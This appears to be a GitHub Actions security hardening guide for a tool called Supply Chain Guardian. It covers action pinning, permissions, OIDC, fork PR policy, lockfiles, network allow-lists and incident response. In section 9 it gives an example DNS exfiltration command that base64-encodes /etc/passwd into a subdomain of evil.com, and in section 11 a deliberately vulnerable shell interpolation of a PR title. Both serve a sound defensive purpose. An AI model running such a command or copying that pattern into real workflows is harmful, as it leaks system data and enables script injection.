# Security Hardening Guide

Hard recommendations to reduce attack surface in GitHub Actions — supply chain and beyond.

---

## 1. Action Pinning (Non-Negotiable)

**Every action must be pinned to a full 40-character commit SHA.**

```yaml
# WRONG — mutable tag, attacker can force-push
- uses: actions/checkout@v4

# RIGHT — immutable commit SHA
- uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11 # v4.1.1
```

**Why:** The tj-actions and reviewdog compromises exploited mutable tags. A tag is a pointer — anyone with write access to the repo can move it to any commit. A SHA is immutable.

**How to migrate:**
```bash
# Generate an action lockfile for your workflows
python scripts/workflow_lockfile.py --generate --workspace .

# Verify lockfile on every CI run
python scripts/workflow_lockfile.py --verify --workspace .
```

---

## 2. Least-Privilege Permissions (Non-Negotiable)

**Set `permissions` at the workflow level to the minimum required.**

```yaml
# WRONG — implicit write-all
name: CI
on: push
jobs:
  build:
    runs-on: ubuntu-latest

# RIGHT — explicit read-only, grant per-job
name: CI
on: push
permissions:
  contents: read
jobs:
  build:
    runs-on: ubuntu-latest
    permissions:
      contents: read
  deploy:
    runs-on: ubuntu-latest
    permissions:
      contents: read
      id-token: write  # only for OIDC
```

**Why:** Without explicit `permissions`, workflows get the repository's default token permissions — typically `write-all` for push events. A compromised action with `write-all` can push code, create releases, and modify branch protection.

**Permission reference:**

| Permission | When to grant |
|---|---|
| `contents: read` | Almost always needed |
| `contents: write` | Only for release/tag creation |
| `pull-requests: write` | Only for PR comment bots |
| `issues: write` | Only for issue creation |
| `security-events: write` | Only for SARIF upload |
| `id-token: write` | Only for OIDC cloud auth |
| `packages: write` | Only for package publishing |
| `actions: read` | Only for reading workflow runs |

Default everything else to `none`.

---

## 3. OIDC Over Stored Secrets

**Replace long-lived cloud credentials with GitHub OIDC tokens.**

```yaml
# WRONG — stored AWS credentials
env:
  AWS_ACCESS_KEY_ID: ${{ secrets.AWS_KEY }}
  AWS_SECRET_ACCESS_KEY: ${{ secrets.AWS_SECRET }}

# RIGHT — OIDC, no stored secrets
permissions:
  id-token: write
  contents: read
steps:
  - uses: aws-actions/configure-aws-credentials@e3dd6a429d7300a6a4c196c26e071d42e0343502
    with:
      role-to-arn: arn:aws:iam::123456789:role/ci-deploy
      aws-region: us-east-1
```

**Why:** Stored secrets are permanent until rotated. If any workflow step leaks them (through a compromised action, script injection, or log exposure), the attacker has persistent access. OIDC tokens are scoped, short-lived (15 min), and tied to the specific workflow/repo/branch.

**Supported providers:** AWS, Azure, GCP, HashiCorp Vault, and any OIDC-compatible IdP.

---

## 4. Environment Protection Rules

**Use GitHub Environments for production deployments.**

```yaml
jobs:
  deploy:
    runs-on: ubuntu-latest
    environment:
      name: production
      url: https://myapp.example.com
```

Configure in Settings → Environments → production:
- **Required reviewers** (1+ approvals before deploy)
- **Wait timer** (e.g., 5 minutes — gives time to abort compromised runs)
- **Branch restrictions** (only `main` can deploy)
- **Secret scoping** (production secrets only available in this environment)

**Why:** Without environments, any workflow run on `main` can deploy. With environments + reviewers, even a compromised workflow requires human approval.

---

## 5. Runner Security

### GitHub-Hosted Runners (Recommended)
- Ephemeral by default — clean VM for every job
- No state persistence between jobs
- Managed security patching

### Self-Hosted Runners (If Required)

| Setting | Recommendation |
|---|---|
| Ephemeral mode | **Required** — use `--ephemeral` flag |
| Runner group | Restrict to specific repos |
| Labels | Use `self-hosted` + specific labels, avoid broad matching |
| Network | Isolate in separate VPC/subnet |
| Privileges | Non-root, minimal filesystem access |
| Docker | Rootless Docker only |
| Monitoring | Log all processes, network connections |
| Forks | **Never allow fork PRs** to run on self-hosted runners |

**Why:** Self-hosted runners persist between jobs. A compromised action can install cron jobs, SSH keys, or modify shell profiles to backdoor future runs.

**Non-negotiable for self-hosted:**
```yaml
# Always use --ephemeral for self-hosted
./config.sh --url https://github.com/ORG/REPO --token TOKEN --ephemeral
```

---

## 6. Fork PR Policies

| Setting | Recommendation |
|---|---|
| `Require approval for all outside collaborators` | **Enabled** |
| `Require approval for first-time contributors` | **Enabled** |
| `Run workflows from fork pull requests` | **Disabled** unless required |
| Send `GITHUB_TOKEN` to fork PRs | **Read-only** |
| Send secrets to fork PRs | **Never** |

**Why:** Fork PRs are the primary vector for pwn-request attacks. The fork author controls the code that is checked out and executed.

---

## 7. Branch Protection

| Rule | Recommendation |
|---|---|
| Require pull request before merging | **Enabled** |
| Require approvals (2+) | **Enabled** |
| Dismiss stale approvals | **Enabled** |
| Require signed commits | **Enabled** |
| Require status checks to pass | **Enabled** (include supply-chain-guardian) |
| Require linear history | Recommended |
| Restrict pushes | Only deploy bots / release automation |
| Do not allow bypassing above settings | **Enabled** for everyone including admins |

---

## 8. Dependency Management

### Lockfiles (Non-Negotiable)

Every ecosystem must have a lockfile committed to the repository:

| Ecosystem | Lockfile |
|---|---|
| npm | `package-lock.json` |
| yarn | `yarn.lock` |
| pnpm | `pnpm-lock.yaml` |
| pip | `requirements.txt` (with hashes) or `pip-compile` output |
| Poetry | `poetry.lock` |
| Go | `go.sum` |
| Rust | `Cargo.lock` |
| Ruby | `Gemfile.lock` |

**Use hash verification where available:**
```bash
# npm
npm ci --ignore-scripts

# pip
pip install --require-hashes -r requirements.txt

# yarn
yarn install --frozen-lockfile --ignore-scripts
```

### Disable Install Scripts in CI

```bash
# npm — skip pre/post install scripts
npm ci --ignore-scripts

# pip — build from wheels only (no setup.py execution)
pip install --only-binary :all: -r requirements.txt
```

**Why:** `postinstall` scripts are the #1 attack vector in malicious npm packages. `setup.py` `cmdclass` overrides are the #1 vector in malicious PyPI packages.

---

## 9. Network Restrictions in CI

### Outbound Allow-List

Restrict CI runner network access to only what's needed:

| Domain | Purpose |
|---|---|
| `github.com`, `*.github.com` | Git operations, API |
| `ghcr.io` | GitHub Container Registry |
| `registry.npmjs.org` | npm packages |
| `pypi.org`, `files.pythonhosted.org` | PyPI packages |
| `rubygems.org` | Ruby gems |
| `proxy.golang.org` | Go modules |
| `crates.io` | Rust crates |

**Block everything else.** If a workflow needs to reach an arbitrary domain, that domain must be explicitly approved.

### DNS Monitoring

Enable DNS query logging on self-hosted runners. Exfiltration via DNS subdomain encoding (e.g., `$(cat /etc/passwd | base64).evil.com`) is nearly impossible to detect without DNS logs.

---

## 10. Secret Hygiene

| Practice | Implementation |
|---|---|
| Rotate secrets every 90 days | Automate with scheduled workflows |
| Scope secrets to environments | Don't put production secrets in repo-level secrets |
| Use secret scanning | Enable GitHub secret scanning + push protection |
| Audit secret access | Review Actions logs for secret usage |
| Mask secrets in logs | Use `::add-mask::` for dynamic secrets |
| Never echo secrets | `echo "$SECRET"` will leak if log masking fails |

**Immediate response if a secret is exposed:**
1. Rotate the secret immediately
2. Revoke all active sessions using that credential
3. Audit usage logs for the compromised credential
4. Run Supply Chain Guardian on the repository to find the exposure vector

---

## 11. Workflow `run:` Block Hygiene

### Never Interpolate Untrusted Input

```yaml
# WRONG — PR title injected into shell
run: echo "Processing PR: ${{ github.event.pull_request.title }}"

# RIGHT — use environment variable
env:
  PR_TITLE: ${{ github.event.pull_request.title }}
run: echo "Processing PR: $PR_TITLE"
```

**Untrusted inputs (never put in `run:` directly):**
- `github.event.pull_request.title`
- `github.event.pull_request.body`
- `github.event.issue.title`
- `github.event.issue.body`
- `github.event.comment.body`
- `github.event.head_commit.message`
- `github.head_ref`
- `github.event.discussion.title`
- `github.event.discussion.body`

### Use `GITHUB_ENV` Safely

```yaml
# WRONG — raw value, can inject
run: echo "MY_VAR=$UNTRUSTED" >> $GITHUB_ENV

# RIGHT — heredoc delimiter prevents injection
run: |
  {
    echo 'MY_VAR<<EOF'
    echo "$UNTRUSTED"
    echo 'EOF'
  } >> "$GITHUB_ENV"
```

---

## 12. Monitoring and Alerting

### Run Supply Chain Guardian on Every Push

```yaml
on:
  push:
    branches: [main, develop, release/*]
  pull_request:
    branches: [main]
  schedule:
    - cron: "0 6 * * 1"
```

### Monitor Upstream Actions (Every 6 Hours)

```yaml
on:
  schedule:
    - cron: "0 */6 * * *"
```

Use `scripts/action_integrity_monitor.py` to detect:
- Tag mutation (force-push to different commit)
- New maintainers added to action repos
- Unsigned commits on action repos
- Large changes hidden behind benign commit messages

### Alert on Every Critical/High Finding

Configure Slack and/or Teams webhooks:
```yaml
- uses: anshumaan-10/supply-chain-guardian@v1
  with:
    slack-webhook-url: ${{ secrets.SLACK_SECURITY_WEBHOOK }}
    teams-webhook-url: ${{ secrets.TEAMS_SECURITY_WEBHOOK }}
    alert-on-severity: high
```

---

## 13. Audit and Compliance Checklist

Run this checklist quarterly:

- [ ] All actions pinned to SHA (not tags)
- [ ] Action lockfile (`action-lock.json`) committed and verified in CI
- [ ] `permissions:` block in every workflow at workflow level
- [ ] No `write-all` permissions anywhere
- [ ] OIDC for all cloud provider auth (no stored keys)
- [ ] Environments configured for production deployments
- [ ] Required reviewers on production environments
- [ ] Lockfiles committed for all package ecosystems
- [ ] `--ignore-scripts` used for npm/yarn in CI
- [ ] Fork PR approval required
- [ ] Branch protection enabled on main and release branches
- [ ] Signed commits required
- [ ] Self-hosted runners in ephemeral mode (if used)
- [ ] Outbound network restricted to allow-list (if self-hosted)
- [ ] Secrets rotated in last 90 days
- [ ] Supply Chain Guardian running on all repositories
- [ ] Proactive integrity monitoring enabled
- [ ] All critical/high findings resolved
- [ ] Incident response plan documented for supply chain events

---

## 14. Incident Response: When You Detect a Compromise

### Immediate (0-15 minutes)

1. **Block** — Supply Chain Guardian automatically fails the pipeline
2. **Rotate** — Rotate every secret that was accessible to the workflow
3. **Revoke** — Revoke all active tokens and sessions
4. **Isolate** — Disable the workflow / quarantine self-hosted runners

### Investigation (15 min - 2 hours)

5. **Audit** — Download workflow run logs for the last 30 days
6. **Trace** — Identify when the compromise was introduced (git blame, audit log)
7. **Scope** — Determine which secrets, artifacts, and deployments were affected
8. **Monitor** — Check for lateral movement (other repos, cloud accounts)

### Recovery (2-24 hours)

9. **Remediate** — Remove compromised actions/dependencies, pin to known-good SHAs
10. **Deploy** — Re-deploy from a verified clean build
11. **Notify** — Inform affected users and downstream consumers
12. **Harden** — Apply the recommendations in this guide to prevent recurrence

---

*This guide was written by Supply Chain Guardian. For the latest version, see [docs/HARDENING.md](HARDENING.md).*
